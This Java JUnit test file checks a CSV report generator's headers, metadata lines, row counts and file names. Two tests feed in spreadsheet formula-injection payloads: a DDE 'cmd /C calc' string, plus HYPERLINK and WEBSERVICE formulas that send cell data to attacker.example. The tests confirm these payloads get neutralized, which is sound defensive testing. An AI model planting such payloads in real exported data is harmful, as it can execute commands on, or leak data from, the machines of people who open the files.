package com.otterworks.report.service;

import com.otterworks.report.model.Report;
import com.otterworks.report.model.ReportCategory;
import com.otterworks.report.model.ReportStatus;
import com.otterworks.report.model.ReportType;
import org.junit.After;
import org.junit.Before;
import org.junit.Test;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Date;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.Properties;

import static org.junit.Assert.assertEquals;
import static org.junit.Assert.assertNotNull;
import static org.junit.Assert.assertTrue;

/**
 * Unit tests for {@link CsvReportGenerator}.
 *
 * Validates that the generator produces a well-formed CSV file with correct
 * column headers, metadata comment lines, and data rows. Does not require
 * a Spring context.
 *
 * Written in JUnit 4 style to match the current stack. After the JUnit 5
 * migration (Axis 4), replace:
 *   - org.junit.Test   -> org.junit.jupiter.api.Test
 *   - org.junit.Before -> org.junit.jupiter.api.BeforeEach
 *   - org.junit.After  -> org.junit.jupiter.api.AfterEach
 *   - org.junit.Assert -> org.junit.jupiter.api.Assertions
 */
public class CsvReportGeneratorTest {

    private CsvReportGenerator generator;
    private File outputDir;

    @Before
    public void setUp() {
        generator = new CsvReportGenerator();
        outputDir = new File(System.getProperty("java.io.tmpdir"), "csv-test-" + System.currentTimeMillis());
        outputDir.mkdirs();
    }

    @After
    public void tearDown() {
        if (outputDir != null && outputDir.exists()) {
            File[] files = outputDir.listFiles();
            if (files != null) {
                for (File f : files) {
                    f.delete();
                }
            }
            outputDir.delete();
        }
    }

    @Test
    public void generateCsvProducesNonEmptyFile() throws IOException {
        Report report = buildReport("Audit Log Export");
        List<Map<String, Object>> data = buildSampleData(5);

        File csv = generator.generateCsv(report, data, outputDir.getAbsolutePath());

        assertNotNull("CSV file should not be null", csv);
        assertTrue("CSV file should exist", csv.exists());
        assertTrue("CSV file should have content", csv.length() > 0);
        assertTrue("CSV file should have .csv extension", csv.getName().endsWith(".csv"));
    }

    @Test
    public void generatedCsvContainsMetadataComments() throws IOException {
        Report report = buildReport("Metadata Check Report");
        List<Map<String, Object>> data = buildSampleData(3);

        File csv = generator.generateCsv(report, data, outputDir.getAbsolutePath());
        List<String> lines = readAllLines(csv);

        assertTrue("CSV should have metadata lines", lines.size() > 0);

        boolean hasReportNameComment = false;
        boolean hasGeneratedComment = false;
        boolean hasPeriodComment = false;
        boolean hasRowsComment = false;

        for (String line : lines) {
            if (line.contains("OtterWorks Report") && line.contains("Metadata Check Report")) {
                hasReportNameComment = true;
            }
            if (line.contains("Generated:")) {
                hasGeneratedComment = true;
            }
            if (line.contains("Period:")) {
                hasPeriodComment = true;
            }
            if (line.contains("Rows:")) {
                hasRowsComment = true;
            }
        }

        assertTrue("CSV should contain report name comment", hasReportNameComment);
        assertTrue("CSV should contain generated timestamp comment", hasGeneratedComment);
        assertTrue("CSV should contain period comment", hasPeriodComment);
        assertTrue("CSV should contain row count comment", hasRowsComment);
    }

    @Test
    public void generatedCsvContainsCorrectColumnHeaders() throws IOException {
        Report report = buildReport("Column Header Report");
        List<Map<String, Object>> data = buildSampleData(2);

        File csv = generator.generateCsv(report, data, outputDir.getAbsolutePath());
        List<String> lines = readAllLines(csv);

        // Find the first non-comment, non-empty line (the header row)
        String headerLine = null;
        for (String line : lines) {
            if (!line.startsWith("\"#") && !line.trim().isEmpty() && !line.equals("\"\"")) {
                headerLine = line;
                break;
            }
        }

        assertNotNull("Should find a header line", headerLine);
        assertTrue("Header should contain user_id column", headerLine.contains("user_id"));
        assertTrue("Header should contain action column", headerLine.contains("action"));
        assertTrue("Header should contain timestamp column", headerLine.contains("timestamp"));
        assertTrue("Header should contain department column", headerLine.contains("department"));
    }

    @Test
    public void generatedCsvContainsCorrectNumberOfDataRows() throws IOException {
        int expectedRows = 10;
        Report report = buildReport("Row Count Report");
        List<Map<String, Object>> data = buildSampleData(expectedRows);

        File csv = generator.generateCsv(report, data, outputDir.getAbsolutePath());
        List<String> lines = readAllLines(csv);

        // Count non-comment, non-empty, non-header data lines
        int dataLineCount = 0;
        boolean headerSeen = false;
        for (String line : lines) {
            if (line.startsWith("\"#") || line.trim().isEmpty() || line.equals("\"\"")) {
                continue;
            }
            if (!headerSeen) {
                headerSeen = true;
                continue;
            }
            dataLineCount++;
        }

        assertEquals("Data row count should match input", expectedRows, dataLineCount);
    }

    @Test
    public void generateCsvWithEmptyDataProducesEmptyFile() throws IOException {
        Report report = buildReport("Empty CSV Report");
        List<Map<String, Object>> emptyData = new ArrayList<Map<String, Object>>();

        File csv = generator.generateCsv(report, emptyData, outputDir.getAbsolutePath());

        assertNotNull("CSV file should not be null", csv);
        assertTrue("CSV file should exist even with no data", csv.exists());
    }

    @Test
    public void generatedCsvFileNameContainsReportName() throws IOException {
        Report report = buildReport("Monthly Security Audit");
        List<Map<String, Object>> data = buildSampleData(1);

        File csv = generator.generateCsv(report, data, outputDir.getAbsolutePath());

        assertTrue("File name should contain sanitized report name",
                csv.getName().startsWith("monthly_security_audit_"));
    }

    @Test
    public void formulaPayloadsFromUpstreamDataAreNeutralized() throws IOException {
        Report report = buildReport("Audit Injection Report");
        List<Map<String, Object>> data = new ArrayList<Map<String, Object>>();
        Map<String, Object> row = new LinkedHashMap<String, Object>();
        row.put("user_id", "@SUM(1+1)*cmd|' /C calc'!A0");
        row.put("action", "=HYPERLINK(\"http://attacker.example/?\"&A1,\"click\")");
        row.put("resource_type", "+1");
        row.put("resource_id", "-1+2");
        row.put("note", "\t=1");
        row.put("delta", Integer.valueOf(-5));
        row.put("=header", "LOGIN");
        data.add(row);

        File csv = generator.generateCsv(report, data, outputDir.getAbsolutePath());
        List<String> lines = readAllLines(csv);

        String headerLine = lines.get(lines.size() - 2);
        String dataLine = lines.get(lines.size() - 1);
        assertEquals("\"user_id\",\"action\",\"resource_type\",\"resource_id\",\"note\",\"delta\",\"'=header\"",
                headerLine);
        assertEquals("\"'@SUM(1+1)*cmd|' /C calc'!A0\","
                + "\"'=HYPERLINK(\"\"http://attacker.example/?\"\"&A1,\"\"click\"\")\","
                + "\"'+1\",\"'-1+2\",\"'\t=1\",\"-5\",\"LOGIN\"", dataLine);
    }

    @Test
    public void formulaPayloadInReportNameIsNeutralizedInBanner() throws IOException {
        Properties templates = new Properties();
        templates.setProperty("banner.title", "${reportName}");
        CsvReportGenerator bannerGenerator = new CsvReportGenerator(new ReportHeaderRenderer(templates));

        File csv = bannerGenerator.generateCsv(buildReport("=WEBSERVICE(\"http://attacker.example\")"),
                buildSampleData(1), outputDir.getAbsolutePath());

        assertEquals("\"'=WEBSERVICE(\"\"http://attacker.example\"\")\"", readAllLines(csv).get(0));
    }

    // ---- Helpers ----

    private Report buildReport(String name) {
        Report report = new Report();
        report.setId(1L);
        report.setReportName(name);
        report.setCategory(ReportCategory.AUDIT_LOG);
        report.setReportType(ReportType.CSV);
        report.setStatus(ReportStatus.GENERATING);
        report.setRequestedBy("test-user");
        report.setDateFrom(new Date(System.currentTimeMillis() - 86400000L * 30));
        report.setDateTo(new Date());
        report.setCreatedAt(new Date());
        return report;
    }

    private List<Map<String, Object>> buildSampleData(int rows) {
        List<Map<String, Object>> data = new ArrayList<Map<String, Object>>();
        String[] users = {"alice", "bob", "carol", "dave", "eve"};
        String[] actions = {"LOGIN", "FILE_UPLOAD", "FILE_DELETE", "SHARE", "PERMISSION_CHANGE"};
        String[] departments = {"Engineering", "Marketing", "Finance", "Legal", "Operations"};

        for (int i = 0; i < rows; i++) {
            Map<String, Object> row = new LinkedHashMap<String, Object>();
            row.put("user_id", users[i % users.length]);
            row.put("action", actions[i % actions.length]);
            row.put("timestamp", new Date(System.currentTimeMillis() - (long) i * 3600000));
            row.put("department", departments[i % departments.length]);
            row.put("ip_address", "192.168.1." + (i + 1));
            data.add(row);
        }
        return data;
    }

    private List<String> readAllLines(File file) throws IOException {
        List<String> lines = new ArrayList<String>();
        try (BufferedReader reader = new BufferedReader(new FileReader(file))) {
            String line;
            while ((line = reader.readLine()) != null) {
                lines.add(line);
            }
        }
        return lines;
    }
}
